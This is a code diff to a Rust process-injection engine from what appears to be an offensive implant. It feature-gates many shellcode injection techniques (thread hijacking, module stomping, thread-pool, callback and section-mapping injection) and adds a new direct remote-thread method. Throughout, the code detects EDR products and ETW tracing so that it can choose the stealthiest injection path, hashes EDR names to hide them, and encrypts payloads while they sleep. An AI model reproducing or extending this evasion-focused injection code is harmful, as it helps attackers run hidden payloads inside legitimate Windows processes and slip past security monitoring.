@@ -246,6 +246,12 @@ pub enum SectionExecMethod {
     /// Use a callback API (from the callback injection module) to trigger
     /// execution. Combines section mapping stealth with callback call stacks.
     Callback,
+    /// Create a remote thread that starts executing immediately (no suspend/
+    /// resume cycle). Faster than `Thread` but creates a thread creation
+    /// event that EDR can hook.  The thread runs with `CreateFlags = 0`
+    /// so there is no `NtResumeThread` follow-up to correlate with the
+    /// `NtCreateThreadEx` call.
+    Direct,
 }
 
 impl std::fmt::Display for SectionExecMethod {
@@ -254,6 +260,7 @@ impl std::fmt::Display for SectionExecMethod {
             Self::Apc => write!(f, "Section-Apc"),
             Self::Thread => write!(f, "Section-Thread"),
             Self::Callback => write!(f, "Section-Callback"),
+            Self::Direct => write!(f, "Section-Direct"),
         }
     }
 }
@@ -354,6 +361,8 @@ impl std::fmt::Display for CallbackApi {
 /// Available injection techniques.
 ///
 /// Variants carry technique-specific configuration where applicable.
+/// Technique variants are gated by Cargo feature flags so that builds can
+/// exclude unwanted techniques at compile time, reducing code surface.
 #[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
 pub enum InjectionTechnique {
     /// Classic process hollowing: spawn a sacrificial process, unmap its
@@ -362,18 +371,21 @@ pub enum InjectionTechnique {
     /// Module stomping: overwrite an existing loaded DLL's `.text` section
     /// with the payload. May call `LdrLoadDll` if no suitable pre-loaded DLL
     /// is found.
+    #[cfg(feature = "module-stomp")]
     ModuleStomp,
     /// **Existing-module stomping**: same principle as `ModuleStomp` but
     /// **never** calls `LoadLibrary` / `LdrLoadDll`. Reuses an already-loaded
     /// DLL backed by a real file on disk. The module appears legitimate to
     /// EDR: valid PEB entry, on-disk backing, no image-load kernel callback.
     /// Prefer over `ModuleStomp` when maximum stealth is required.
+    #[cfg(feature = "module-stomp")]
     ExistingModuleStomp,
     /// Early-bird APC injection: queue a user-mode APC to a thread in the
     /// target before it starts executing.
     EarlyBirdApc,
     /// Thread hijacking: suspend an existing thread, redirect RIP to the
     /// payload, then restore after execution.
+    #[cfg(feature = "thread-hijack")]
     ThreadHijack,
     /// **PoolParty** — Thread pool injection using one of 8 SafeBreach Labs
     /// variants. All variants execute the payload on an existing thread pool
@@ -386,12 +398,14 @@ pub enum InjectionTechnique {
     /// Variant 1 (`Work`) is the original `TpAllocWork` + `TpPostWork`.
     /// Variant 8 (`AsyncIo`) is the simplest and stealthiest.
     /// Variant 6 (`Alpc`) is stealthiest but may not be available.
+    #[cfg(feature = "threadpool-inject")]
     ThreadPool {
         /// Which PoolParty variant to use. `None` = auto-select.
         variant: Option<ThreadPoolVariant>,
     },
     /// **NEW** — Fiber injection: create a fiber whose start address is the
     /// payload, switch to it from a hijacked thread.
+    #[cfg(feature = "fiber-inject")]
     FiberInject,
     /// **NEW** — CONTEXT-only injection: modify a thread's CONTEXT (RIP/RSP)
     /// to redirect execution to existing code already mapped in the target
@@ -402,6 +416,7 @@ pub enum InjectionTechnique {
     /// triad (alloc + write + execute) and uses only:
     ///   NtOpenThread, NtGetContextThread, NtSetContextThread,
     ///   NtWriteVirtualMemory (one call), NtResumeThread/NtAlertThread.
+    #[cfg(feature = "context-only")]
     ContextOnly,
     /// **NEW** — Waiting Thread Hijacking: targets a thread already in a
     /// kernel wait state (Sleep, WaitForSingleObject, etc.), reads its
@@ -422,6 +437,7 @@ pub enum InjectionTechnique {
     /// (RIP/RSP), WTH modifies the stack return address. WTH is
     /// preferred when suitable waiting threads are found; ContextOnly
     /// is the fallback when no waiting threads are available.
+    #[cfg(feature = "thread-hijack")]
     WaitingThreadHijack {
         target_pid: u32,
         target_tid: Option<u32>,
@@ -444,6 +460,7 @@ pub enum InjectionTechnique {
     /// If `api` is `None`, auto-selects randomly weighted toward less-
     /// commonly-monitored APIs. If the selected API fails, falls back
     /// through remaining APIs, then to ThreadPool injection.
+    #[cfg(feature = "callback-inject")]
     CallbackInjection {
         target_pid: u32,
         api: Option<CallbackApi>,
@@ -470,6 +487,7 @@ pub enum InjectionTechnique {
     ///
     /// If `exec_method` is `None`, auto-selects: APC if an alertable
     /// thread is found, else Thread creation.
+    #[cfg(feature = "section-map")]
     SectionMapping {
         target_pid: u32,
         /// Execution method: Apc, Thread, or Callback. None = auto-select.
@@ -822,7 +840,7 @@ impl InjectionHandle {
                                 &mut br5 as *mut _ as u64,
                             );
                             if rs.is_ok() && rs.unwrap() >= 0 && br5 == 8 && dll_base != 0 {
-                                log::info!(
+                                tracing::info!(
                                     "injection_engine: resolved ntdll in target pid {} \
                                      via PEB walk: {:#x}",
                                     self.target_pid,
@@ -862,10 +880,10 @@ impl InjectionHandle {
     /// cycle.
     ///
     /// This method:
-    /// 1. Generates a per-payload XChaCha20-Poly1305 key.
+    /// 1. Generates a per-payload AES-256-GCM key.
     /// 2. Writes a position-independent "sleep stub" into the target process
     ///    at `injected_base_addr + payload_size + 0x1000` (page-aligned).
-    /// 3. The sleep stub encrypts the payload region with XChaCha20-Poly1305
+    /// 3. The sleep stub encrypts the payload region with AES-256-GCM
     ///    (key passed in XMM0/XMM1), calls NtDelayExecution, then decrypts
     ///    and jumps back to the payload entry point on wake.
     /// 4. Scans the payload bytes for NtDelayExecution/SleepEx syscall
@@ -903,9 +921,9 @@ impl InjectionHandle {
             //   a. Receives base_addr (rcx) and size (rdx) as parameters.
             //   b. Key is passed in xmm0 (low 16 bytes) and xmm1 (high 16 bytes).
             //   c. Calls NtProtectVirtualMemory(base, size, PAGE_READWRITE).
-            //   d. Encrypts the region with XChaCha20-Poly1305 (simplified:
-            //      XOR-based "encryption" for the stub itself; the real AEAD
-            //      encryption happens in the parent agent via remote operations).
+            //   d. Encrypts the region with XOR-based obfuscation (the real
+            //      AEAD encryption happens in the parent agent via remote
+            //      operations using AES-256-GCM).
             //   e. Calls NtProtectVirtualMemory(base, size, PAGE_NOACCESS).
             //   f. Calls NtDelayExecution(duration_100ns).
             //   g. On wake: NtProtectVirtualMemory(base, size, PAGE_READWRITE),
@@ -964,7 +982,7 @@ impl InjectionHandle {
                 } else {
                     // MZ check failed — ntdll is at a different base in the
                     // target.  Fall back to resolving via the target's PEB.
-                    log::warn!(
+                    tracing::warn!(
                         "injection_engine: ntdll MZ mismatch at {:#x} in pid {}, \
                          resolving from target PEB",
                         local_ntdll,
@@ -1235,7 +1253,7 @@ impl InjectionHandle {
 
                         // Check if the call target matches NtDelayExecution.
                         if call_target as usize == nt_delay_addr {
-                            log::info!(
+                            tracing::info!(
                                 "injection_engine: found NtDelayExecution call at payload+{:#x}, \
                                  patching to sleep stub at {:#x}",
                                 i,
@@ -1282,7 +1300,7 @@ impl InjectionHandle {
                             );
                             if pr.is_ok() && pr.unwrap() >= 0 && ptr_read == 8 {
                                 if target_ptr == nt_delay_addr as u64 {
-                                    log::info!(
+                                    tracing::info!(
                                         "injection_engine: found indirect NtDelayExecution call \
                                          at payload+{:#x}, patching to sleep stub",
                                         i
@@ -1348,7 +1366,7 @@ impl InjectionHandle {
                         payload_size as u64,
                     );
                 } else {
-                    log::warn!(
+                    tracing::warn!(
                         "injection_engine: could not find NtDelayExecution call in payload; \
                          sleep stub installed but payload not patched"
                     );
@@ -1373,7 +1391,7 @@ impl InjectionHandle {
             self.sleep_enrolled = true;
             self.sleep_stub_addr = remote_stub;
 
-            log::info!(
+            tracing::info!(
                 "injection_engine: enrolled pid={} payload={:#x} size={} in sleep obfuscation \
                  (stub at {:#x})",
                 self.target_pid,
@@ -1428,7 +1446,7 @@ pub fn inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError
         let etw_status = check_etw_trace(target_pid)?;
         match etw_status {
             EtwStatus::Traced { providers } => {
-                log::warn!(
+                tracing::warn!(
                     "injection_engine: ETW providers {:?} tracing pid {} — \
                      injection may be detected",
                     providers,
@@ -1437,13 +1455,13 @@ pub fn inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError
                 // Proceed but the caller should consider evasive mode.
             }
             EtwStatus::Safe => {
-                log::debug!(
+                tracing::debug!(
                     "injection_engine: no ETW tracing detected for pid {}",
                     target_pid
                 );
             }
             EtwStatus::Unknown => {
-                log::debug!(
+                tracing::debug!(
                     "injection_engine: ETW status unknown for pid {}; proceeding",
                     target_pid,
                 );
@@ -1465,7 +1483,7 @@ pub fn inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError
     };
 
     for technique in &techniques {
-        log::info!(
+        tracing::info!(
             "injection_engine: attempting {:?} into pid {} ({})",
             technique,
             target_pid,
@@ -1475,7 +1493,7 @@ pub fn inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError
         match try_technique(technique.clone(), target_pid, &config.payload) {
             Ok(handle) => return Ok(handle),
             Err(e) => {
-                log::warn!("injection_engine: {:?} failed: {}", technique, e);
+                tracing::warn!("injection_engine: {:?} failed: {}", technique, e);
                 last_err = e;
                 continue;
             }
@@ -1493,7 +1511,7 @@ pub fn inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError
 ///
 /// To avoid embedding plaintext EDR names in the binary, we use `enc_str!`
 /// for compile-time encryption and then hash at runtime. The list is stored
-/// as a lazy_static array of pre-computed djb2 hashes so that no string
+/// as a `once_cell::sync::Lazy` array of pre-computed djb2 hashes so that no string
 /// literals appear in the `.rdata` section.
 fn edr_process_name_hashes() -> &'static [u32] {
     // Compute djb2 hashes of lowercase EDR process names at build time.
@@ -1603,7 +1621,7 @@ pub unsafe fn pre_injection_check(target_pid: u32) -> Result<InjectionViability,
 
     for &edr_hash in edr_hashes {
         if image_hash == edr_hash {
-            log::warn!(
+            tracing::warn!(
                 "injection_engine: target pid {} IS an EDR process (hash match {:#010x})",
                 target_pid,
                 edr_hash,
@@ -1615,14 +1633,19 @@ pub unsafe fn pre_injection_check(target_pid: u32) -> Result<InjectionViability,
     // ── Step 3: EDR DLL Check ────────────────────────────────────────────
     let edr_modules = check_edr_modules(target_pid)?;
     if !edr_modules.is_empty() {
-        log::warn!(
+        tracing::warn!(
             "injection_engine: target pid {} has EDR modules: {:?}",
             target_pid,
             edr_modules,
         );
         return Ok(InjectionViability::HasEDRModule {
             modules: edr_modules,
-            fallback_technique: InjectionTechnique::ModuleStomp,
+            fallback_technique: {
+                #[cfg(feature = "module-stomp")]
+                { InjectionTechnique::ModuleStomp }
+                #[cfg(not(feature = "module-stomp"))]
+                { InjectionTechnique::ProcessHollow }
+            },
         });
     }
 
@@ -1636,24 +1659,37 @@ pub unsafe fn pre_injection_check(target_pid: u32) -> Result<InjectionViability,
     let integrity_level = query_integrity_level(target_pid);
 
     // ── Step 6: Determine recommended technique ──────────────────────────
-    let recommended = if thread_count > 50 {
-        // Many threads → plenty of candidates for WTH (waiting thread hijack).
-        InjectionTechnique::WaitingThreadHijack {
-            target_pid,
-            target_tid: None,
+    let recommended = {
+        #[cfg(feature = "thread-hijack")]
+        {
+            if thread_count > 50 {
+                // Many threads → plenty of candidates for WTH (waiting thread hijack).
+                InjectionTechnique::WaitingThreadHijack {
+                    target_pid,
+                    target_tid: None,
+                }
+            } else if thread_count < 3 {
+                // Very few threads → risky to hijack a thread. Use APC.
+                InjectionTechnique::EarlyBirdApc
+            } else {
+                // Moderate thread count → WTH is still preferred (no SuspendThread).
+                InjectionTechnique::WaitingThreadHijack {
+                    target_pid,
+                    target_tid: None,
+                }
+            }
         }
-    } else if thread_count < 3 {
-        // Very few threads → risky to hijack a thread. Use APC or ThreadPool.
-        InjectionTechnique::EarlyBirdApc
-    } else {
-        // Moderate thread count → WTH is still preferred (no SuspendThread).
-        InjectionTechnique::WaitingThreadHijack {
-            target_pid,
-            target_tid: None,
+        #[cfg(not(feature = "thread-hijack"))]
+        {
+            if thread_count < 3 {
+                InjectionTechnique::EarlyBirdApc
+            } else {
+                InjectionTechnique::NtSetInfoProcess { target_pid }
+            }
         }
     };
 
-    log::info!(
+    tracing::info!(
         "injection_engine: pid {} viable — arch={}, threads={}, integrity={:#x}, rec={:?}",
         target_pid,
         arch_match,
@@ -1708,7 +1744,7 @@ pub fn evasiveness_inject(config: InjectionConfig) -> Result<InjectionHandle, In
     // 3. Determine technique based on viability.
     let mut technique = match viability {
         InjectionViability::IsEDR => {
-            log::error!(
+            tracing::error!(
                 "injection_engine: refusing to inject into EDR process pid {}",
                 target_pid,
             );
@@ -1727,22 +1763,28 @@ pub fn evasiveness_inject(config: InjectionConfig) -> Result<InjectionHandle, In
             modules,
             fallback_technique,
         } => {
-            log::warn!(
+            tracing::warn!(
                 "injection_engine: EDR modules {:?} detected in pid {} — \
-                 forcing WaitingThreadHijack (no SuspendThread signal), \
-                 fallback ContextOnly then {:?}",
+                 forcing evasive technique, fallback {:?}",
                 modules,
                 target_pid,
                 fallback_technique,
             );
-            // When EDR is present, WaitingThreadHijack is the stealthiest
-            // option because it avoids SuspendThread/ResumeThread AND
-            // CONTEXT modification. Falls back to ContextOnly (no alloc
-            // triad) if no suitable waiting threads.
-            Some(InjectionTechnique::WaitingThreadHijack {
-                target_pid,
-                target_tid: None,
-            })
+            // When EDR is present, use the stealthiest available technique.
+            #[cfg(feature = "thread-hijack")]
+            {
+                // WaitingThreadHijack avoids SuspendThread/ResumeThread AND
+                // CONTEXT modification. Falls back to ContextOnly (no alloc
+                // triad) if no suitable waiting threads.
+                Some(InjectionTechnique::WaitingThreadHijack {
+                    target_pid,
+                    target_tid: None,
+                })
+            }
+            #[cfg(not(feature = "thread-hijack"))]
+            {
+                Some(InjectionTechnique::NtSetInfoProcess { target_pid })
+            }
         }
         InjectionViability::Safe {
             recommended_technique,
@@ -1760,25 +1802,32 @@ pub fn evasiveness_inject(config: InjectionConfig) -> Result<InjectionHandle, In
         match etw_status {
             EtwStatus::Traced { providers } => {
                 etw_traced = true;
-                log::warn!(
+                tracing::warn!(
                     "injection_engine: EDR ETW auto-loggers {:?} active — \
-                     forcing WaitingThreadHijack for pid {} (no SuspendThread signal)",
+                     forcing evasive technique for pid {} (no SuspendThread signal)",
                     providers,
                     target_pid,
                 );
-                technique = Some(InjectionTechnique::WaitingThreadHijack {
-                    target_pid,
-                    target_tid: None,
-                });
+                #[cfg(feature = "thread-hijack")]
+                {
+                    technique = Some(InjectionTechnique::WaitingThreadHijack {
+                        target_pid,
+                        target_tid: None,
+                    });
+                }
+                #[cfg(not(feature = "thread-hijack"))]
+                {
+                    technique = Some(InjectionTechnique::NtSetInfoProcess { target_pid });
+                }
             }
             EtwStatus::Safe => {
-                log::debug!(
+                tracing::debug!(
                     "injection_engine: no EDR ETW auto-loggers for pid {}",
                     target_pid,
                 );
             }
             EtwStatus::Unknown => {
-                log::debug!(
+                tracing::debug!(
                     "injection_engine: ETW status unknown for pid {}; \
                      proceeding with caution",
                     target_pid,
@@ -1824,7 +1873,7 @@ fn inject_with_evasion(
     };
 
     for tech in &techniques {
-        log::info!(
+        tracing::info!(
             "injection_engine: attempting {:?} into pid {} (evasion mode)",
             tech,
             target_pid,
@@ -1838,7 +1887,7 @@ fn inject_with_evasion(
         match try_technique_evasive(tech.clone(), target_pid, &config.payload, jitter) {
             Ok(handle) => return Ok(handle),
             Err(e) => {
-                log::warn!("injection_engine: {:?} failed: {}", tech, e);
+                tracing::warn!("injection_engine: {:?} failed: {}", tech, e);
                 last_err = e;
                 continue;
             }
@@ -1864,8 +1913,6 @@ fn try_technique_evasive(
     // already use RW→write→RX (not RWX).
     match technique {
         InjectionTechnique::ProcessHollow
-        | InjectionTechnique::ModuleStomp
-        | InjectionTechnique::ExistingModuleStomp
         | InjectionTechnique::EarlyBirdApc => {
             // These delegate to the existing injection module which already
             // handles memory protection correctly. We just add jitter.
@@ -1874,9 +1921,18 @@ fn try_technique_evasive(
             }
             try_technique(technique, pid, payload)
         }
-        InjectionTechnique::ThreadHijack
-        | InjectionTechnique::ThreadPool { .. }
-        | InjectionTechnique::FiberInject => {
+        #[cfg(feature = "module-stomp")]
+        InjectionTechnique::ModuleStomp
+        | InjectionTechnique::ExistingModuleStomp => {
+            // These delegate to the existing injection module which already
+            // handles memory protection correctly. We just add jitter.
+            if jitter {
+                jitter_delay(200);
+            }
+            try_technique(technique, pid, payload)
+        }
+        #[cfg(feature = "thread-hijack")]
+        InjectionTechnique::ThreadHijack => {
             // These use the internal alloc_write_exec path which already
             // does RW → write → RX. Add jitter between steps.
             if jitter {
@@ -1888,6 +1944,33 @@ fn try_technique_evasive(
             }
             result
         }
+        #[cfg(feature = "threadpool-inject")]
+        InjectionTechnique::ThreadPool { .. } => {
+            // These use the internal alloc_write_exec path which already
+            // does RW → write → RX. Add jitter between steps.
+            if jitter {
+                jitter_delay(150);
+            }
+            let result = try_technique(technique, pid, payload);
+            if jitter {
+                jitter_delay(100);
+            }
+            result
+        }
+        #[cfg(feature = "fiber-inject")]
+        InjectionTechnique::FiberInject => {
+            // These use the internal alloc_write_exec path which already
+            // does RW → write → RX. Add jitter between steps.
+            if jitter {
+                jitter_delay(150);
+            }
+            let result = try_technique(technique, pid, payload);
+            if jitter {
+                jitter_delay(100);
+            }
+            result
+        }
+        #[cfg(feature = "context-only")]
         InjectionTechnique::ContextOnly => {
             // CONTEXT-only injection avoids the alloc+write+execute triad
             // entirely. It only makes a single NtWriteVirtualMemory call
@@ -1902,6 +1985,7 @@ fn try_technique_evasive(
             }
             result
         }
+        #[cfg(feature = "thread-hijack")]
         InjectionTechnique::WaitingThreadHijack { .. } => {
             // Waiting Thread Hijacking: even stealthier than ContextOnly
             // when suitable waiting threads are found. No Suspend/Resume,
@@ -1916,6 +2000,7 @@ fn try_technique_evasive(
             }
             result
         }
+        #[cfg(feature = "callback-inject")]
         InjectionTechnique::CallbackInjection { .. } => {
             // Callback injection: payload runs from within a legitimate
             // Windows code path. The call stack originates from kernel32/
@@ -1930,6 +2015,7 @@ fn try_technique_evasive(
             }
             result
         }
+        #[cfg(feature = "section-map")]
         InjectionTechnique::SectionMapping { .. } => {
             // Section mapping injection: avoids NtWriteVirtualMemory entirely
             // by using NtCreateSection + NtMapViewOfSection. The payload is
@@ -2649,8 +2735,8 @@ unsafe fn query_integrity_level_inner(h_proc: *mut c_void) -> u32 {
 unsafe fn open_process_for_query(target_pid: u32) -> Result<*mut c_void, InjectionError> {
     let mut client_id = [0u64; 2];
     client_id[0] = target_pid as u64;
-    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     // PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
     let access_mask: u64 = 0x0400 | 0x0010;
@@ -2718,18 +2804,22 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
     //   and use existing thread pool worker threads. When variant is None,
     //   the dispatch layer auto-selects a specific PoolParty variant.
 
+    #[cfg(feature = "thread-hijack")]
     let wth = InjectionTechnique::WaitingThreadHijack {
         target_pid: 0, // Will be filled by dispatch
         target_tid: None,
     };
 
+    #[cfg(feature = "threadpool-inject")]
     let tp = InjectionTechnique::ThreadPool { variant: None };
 
+    #[cfg(feature = "callback-inject")]
     let cb = InjectionTechnique::CallbackInjection {
         target_pid: 0,
         api: None,
     };
 
+    #[cfg(feature = "section-map")]
     let sm = InjectionTechnique::SectionMapping {
         target_pid: 0,
         exec_method: None,
@@ -2749,15 +2839,19 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
     };
 
     if lower.contains("svchost") {
-        let mut techniques = vec![
-            wth.clone(),
-            InjectionTechnique::ContextOnly,
-            sm,
-            nsip,
-            cb.clone(),
-            InjectionTechnique::EarlyBirdApc,
-            tp,
-        ];
+        let mut techniques = vec![];
+        #[cfg(feature = "thread-hijack")]
+        techniques.push(wth.clone());
+        #[cfg(feature = "context-only")]
+        techniques.push(InjectionTechnique::ContextOnly);
+        #[cfg(feature = "section-map")]
+        techniques.push(sm);
+        techniques.push(nsip);
+        #[cfg(feature = "callback-inject")]
+        techniques.push(cb.clone());
+        techniques.push(InjectionTechnique::EarlyBirdApc);
+        #[cfg(feature = "threadpool-inject")]
+        techniques.push(tp);
         #[cfg(feature = "transacted-hollowing")]
         techniques.push(th);
         #[cfg(feature = "phantom-dll-hollow")]
@@ -2765,19 +2859,26 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         techniques.push(InjectionTechnique::ProcessHollow);
         #[cfg(feature = "delayed-stomp")]
         techniques.push(InjectionTechnique::DelayedModuleStomp);
+        #[cfg(feature = "module-stomp")]
         techniques.push(InjectionTechnique::ExistingModuleStomp);
+        #[cfg(feature = "module-stomp")]
         techniques.push(InjectionTechnique::ModuleStomp);
         techniques
     } else if lower.contains("explorer") {
-        let mut techniques = vec![
-            wth.clone(),
-            InjectionTechnique::ContextOnly,
-            sm,
-            nsip,
-            cb.clone(),
-            InjectionTechnique::ThreadHijack,
-            InjectionTechnique::FiberInject,
-        ];
+        let mut techniques = vec![];
+        #[cfg(feature = "thread-hijack")]
+        techniques.push(wth.clone());
+        #[cfg(feature = "context-only")]
+        techniques.push(InjectionTechnique::ContextOnly);
+        #[cfg(feature = "section-map")]
+        techniques.push(sm);
+        techniques.push(nsip);
+        #[cfg(feature = "callback-inject")]
+        techniques.push(cb.clone());
+        #[cfg(feature = "thread-hijack")]
+        techniques.push(InjectionTechnique::ThreadHijack);
+        #[cfg(feature = "fiber-inject")]
+        techniques.push(InjectionTechnique::FiberInject);
         #[cfg(feature = "transacted-hollowing")]
         techniques.push(th);
         #[cfg(feature = "phantom-dll-hollow")]
@@ -2785,32 +2886,49 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         techniques.push(InjectionTechnique::ProcessHollow);
         #[cfg(feature = "delayed-stomp")]
         techniques.push(InjectionTechnique::DelayedModuleStomp);
+        #[cfg(feature = "module-stomp")]
         techniques.push(InjectionTechnique::ExistingModuleStomp);
+        #[cfg(feature = "module-stomp")]
         techniques.push(InjectionTechnique::ModuleStomp);
         techniques
     } else if lower.contains("service") || lower.ends_with("svc.exe") || lower.ends_with("host.exe")
     {
-        let mut techniques = vec![
-            wth.clone(),
-            InjectionTechnique::ContextOnly,
-            sm,
-            nsip,
-            cb.clone(),
-        ];
+        let mut techniques = vec![];
+        #[cfg(feature = "thread-hijack")]
+        techniques.push(wth.clone());
+        #[cfg(feature = "context-only")]
+        techniques.push(InjectionTechnique::ContextOnly);
+        #[cfg(feature = "section-map")]
+        techniques.push(sm);
+        techniques.push(nsip);
+        #[cfg(feature = "callback-inject")]
+        techniques.push(cb.clone());
         #[cfg(feature = "delayed-stomp")]
         techniques.push(InjectionTechnique::DelayedModuleStomp);
+        #[cfg(feature = "module-stomp")]
         techniques.push(InjectionTechnique::ExistingModuleStomp);
+        #[cfg(feature = "module-stomp")]
         techniques.push(InjectionTechnique::ModuleStomp);
         #[cfg(feature = "transacted-hollowing")]
         techniques.push(th);
         #[cfg(feature = "phantom-dll-hollow")]
         techniques.push(InjectionTechnique::PhantomDllHollow);
         techniques.push(InjectionTechnique::ProcessHollow);
+        #[cfg(feature = "threadpool-inject")]
         techniques.push(tp);
         techniques.push(InjectionTechnique::EarlyBirdApc);
         techniques
     } else {
-        let mut techniques = vec![wth.clone(), InjectionTechnique::ContextOnly, sm, nsip, cb];
+        let mut techniques = vec![];
+        #[cfg(feature = "thread-hijack")]
+        techniques.push(wth.clone());
+        #[cfg(feature = "context-only")]
+        techniques.push(InjectionTechnique::ContextOnly);
+        #[cfg(feature = "section-map")]
+        techniques.push(sm);
+        techniques.push(nsip);
+        #[cfg(feature = "callback-inject")]
+        techniques.push(cb);
         #[cfg(feature = "transacted-hollowing")]
         techniques.push(th);
         #[cfg(feature = "phantom-dll-hollow")]
@@ -2818,11 +2936,16 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         techniques.push(InjectionTechnique::ProcessHollow);
         #[cfg(feature = "delayed-stomp")]
         techniques.push(InjectionTechnique::DelayedModuleStomp);
+        #[cfg(feature = "module-stomp")]
         techniques.push(InjectionTechnique::ExistingModuleStomp);
+        #[cfg(feature = "module-stomp")]
         techniques.push(InjectionTechnique::ModuleStomp);
         techniques.push(InjectionTechnique::EarlyBirdApc);
+        #[cfg(feature = "threadpool-inject")]
         techniques.push(tp);
+        #[cfg(feature = "thread-hijack")]
         techniques.push(InjectionTechnique::ThreadHijack);
+        #[cfg(feature = "fiber-inject")]
         techniques.push(InjectionTechnique::FiberInject);
         techniques
     }
@@ -2837,19 +2960,27 @@ fn try_technique(
 ) -> Result<InjectionHandle, InjectionError> {
     match technique {
         InjectionTechnique::ProcessHollow => inject_process_hollow(pid, payload),
+        #[cfg(feature = "module-stomp")]
         InjectionTechnique::ModuleStomp => inject_module_stomp(pid, payload),
         InjectionTechnique::EarlyBirdApc => inject_early_bird(pid, payload),
+        #[cfg(feature = "thread-hijack")]
         InjectionTechnique::ThreadHijack => inject_thread_hijack(pid, payload),
+        #[cfg(feature = "threadpool-inject")]
         InjectionTechnique::ThreadPool { variant } => inject_threadpool(pid, payload, variant),
+        #[cfg(feature = "fiber-inject")]
         InjectionTechnique::FiberInject => inject_fiber(pid, payload),
+        #[cfg(feature = "context-only")]
         InjectionTechnique::ContextOnly => inject_context_only(pid, None, payload),
+        #[cfg(feature = "thread-hijack")]
         InjectionTechnique::WaitingThreadHijack {
             target_pid: _,
             target_tid,
         } => inject_waiting_thread_hijack(pid, target_tid, payload),
+        #[cfg(feature = "callback-inject")]
         InjectionTechnique::CallbackInjection { target_pid: _, api } => {
             inject_callback(pid, payload, api)
         }
+        #[cfg(feature = "section-map")]
         InjectionTechnique::SectionMapping {
             target_pid: _,
             exec_method,
@@ -2862,6 +2993,7 @@ fn try_technique(
             inject_transacted_hollowing_dispatch(pid, payload)
         }
         InjectionTechnique::DelayedModuleStomp => inject_delayed_stomp_dispatch(pid, payload),
+        #[cfg(feature = "module-stomp")]
         InjectionTechnique::ExistingModuleStomp => inject_existing_module_stomp(pid, payload),
         InjectionTechnique::PhantomDllHollow => inject_phantom_dll_hollow_dispatch(pid, payload),
     }
@@ -2891,6 +3023,7 @@ fn inject_transacted_hollowing_dispatch(
     unsafe {
         crate::injection_transacted::inject_transacted_hollowing(
             payload,
+            None, // let get_sacrificial_path pick the default
             etw_blinding,
             rollback_timeout_ms,
         )
@@ -2915,7 +3048,8 @@ fn inject_transacted_hollowing_dispatch(
 ///
 /// Reads the `delayed_stomp` config to determine delay range and sacrificial
 /// DLL list, then delegates to the `injection_delayed_stomp` module.
-/// This is a *blocking* call — the full delay elapses before returning.
+/// This is a **non-blocking** call — Phase 1 runs synchronously, then a
+/// background thread handles the delay and Phase 2 stomp/execute.
 #[cfg(feature = "delayed-stomp")]
 fn inject_delayed_stomp_dispatch(
     pid: u32,
@@ -3027,13 +3161,14 @@ fn inject_process_hollow(pid: u32, payload: &[u8]) -> Result<InjectionHandle, In
         technique_used: InjectionTechnique::ProcessHollow,
         injected_base_addr: injected.remote_base,
         payload_size: injected.payload_size,
-        thread_handle: injected.thread_handle,
-        process_handle: injected.process_handle,
+        thread_handle: injected.thread_handle.map(|h| h as *mut _),
+        process_handle: injected.process_handle as *mut _,
         sleep_enrolled: false,
         sleep_stub_addr: 0,
     })
 }
 
+#[cfg(feature = "module-stomp")]
 fn inject_module_stomp(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     crate::injection::inject_with_method(
         crate::injection::InjectionMethod::ModuleStomp,
@@ -3057,6 +3192,7 @@ fn inject_module_stomp(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inje
     })
 }
 
+#[cfg(feature = "module-stomp")]
 fn inject_existing_module_stomp(
     pid: u32,
     payload: &[u8],
@@ -3112,6 +3248,7 @@ fn inject_early_bird(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inject
     })
 }
 
+#[cfg(feature = "thread-hijack")]
 fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     // Thread hijacking: suspend an existing thread, write shellcode, redirect
     // RIP, resume.  We find a candidate thread via find_alertable_thread or
@@ -3133,7 +3270,7 @@ fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inj
                 reason: format!("no hijackable thread found in pid {}", pid),
             })?;
 
-        log::info!(
+        tracing::info!(
             "injection_engine: ThreadHijack: hijacking thread {} in pid {}",
             tid,
             pid,
@@ -3156,8 +3293,8 @@ fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inj
         }
 
         // ── Step 4: Get the thread's current context ────────────────────
-        let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
-        ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
+        let mut ctx: crate::win_types::CONTEXT = std::mem::zeroed();
+        ctx.ContextFlags = crate::win_types::CONTEXT_FULL;
         let get_ctx = crate::emulated_syscall!(
             "NtGetContextThread",
             h_thread as u64,
@@ -3175,7 +3312,7 @@ fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inj
 
         // Save original RIP for debugging.
         let original_rip = context_ip(&ctx);
-        log::debug!(
+        tracing::debug!(
             "injection_engine: ThreadHijack: thread {} original RIP={:#x}",
             tid,
             original_rip,
@@ -3215,7 +3352,7 @@ fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inj
         );
         let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
 
-        log::info!(
+        tracing::info!(
             "injection_engine: ThreadHijack: thread {} RIP redirected {:#x} → {:#x}",
             tid,
             original_rip,
